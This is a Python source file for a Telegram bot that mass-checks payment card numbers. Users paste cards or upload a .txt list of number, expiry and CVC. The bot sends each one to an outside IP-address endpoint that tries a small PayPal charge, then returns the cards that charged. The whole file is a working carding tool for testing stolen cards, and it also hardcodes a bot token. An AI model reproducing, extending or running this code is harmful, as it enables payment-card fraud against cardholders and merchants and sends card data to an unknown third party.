import telebot
import time
import threading
import requests
import re
from telebot import types

token = '7700737624:AAEKOb2kJFTN6g-Cod4vDphfpqlJSsjzoHU'
bot = telebot.TeleBot(token, parse_mode="HTML")

stopuser = {}

def pali(ccx):
    ccx = ccx.strip()
    try:
        url = f"http://138.128.240.15:8024/paypal_1?cc={ccx}"
        r = requests.get(url, timeout=30)
        text = r.text
        if "ORDER APPROVED" in text.upper() or "APPROVED" in text.upper() or "SUCCESS" in text.upper():
            return "CHARGE 1.00$"
        else:
            return "DECLINED"
    except:
        return "ERROR"

def reg(cc):
    parts = [p for p in re.split(r'\D+', cc) if p]
    if len(parts) >= 4:
        pan = parts[0]
        mm = parts[1].zfill(2)
        yy = parts[2]
        cvc = parts[3]
        return f"{pan}|{mm}|{yy}|{cvc}"
    return None

@bot.message_handler(commands=["start"])
def start(message):
    bot.send_message(message.chat.id, "Welcome\nUse /pp for single check or send .txt file")

@bot.message_handler(func=lambda m: m.text and m.text.lower().startswith(('.pp', '/pp')))
def single(message):
    ko = bot.reply_to(message, "Checking...").message_id
    try:
        text = message.reply_to_message.text if message.reply_to_message else message.text
        cc = reg(text)
        if not cc:
            return bot.edit_message_text("Invalid Card!", message.chat.id, ko)
        result = pali(cc)
        bot.edit_message_text(f"<b>Card:</b> <code>{cc}</code>\n<b>Status:</b> <code>{result}</code>", message.chat.id, ko, parse_mode="HTML")
    except:
        bot.edit_message_text("Error", message.chat.id, ko)

@bot.message_handler(content_types=['document'])
def doc(message):
    if not message.document.file_name.endswith('.txt'):
        return
    user_id = str(message.from_user.id)
    file = bot.get_file(message.document.file_id)
    downloaded = bot.download_file(file.file_path)
    with open(f"com{user_id}.txt", "wb") as f:
        f.write(downloaded)
    bts = types.InlineKeyboardMarkup()
    bts.add(types.InlineKeyboardButton("Start Check", callback_data='startcheck'))
    bot.reply_to(message, "File Received. Click to start.", reply_markup=bts)

@bot.callback_query_handler(func=lambda call: call.data == 'startcheck')
def mass(call):
    def run():
        user_id = str(call.from_user.id)
        filename = f"com{user_id}.txt"
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        for line in lines:
            cc = reg(line.strip())
            if cc:
                result = pali(cc)
                if "CHARGE" in result:
                    bot.send_message(call.from_user.id, f"✅ Charged\n{cc}\n{result}")
                time.sleep(5)
        bot.send_message(call.from_user.id, "✅ Checking Finished")
    threading.Thread(target=run).start()

print("🚀 Bot Started")
bot.infinity_polling(none_stop=True)
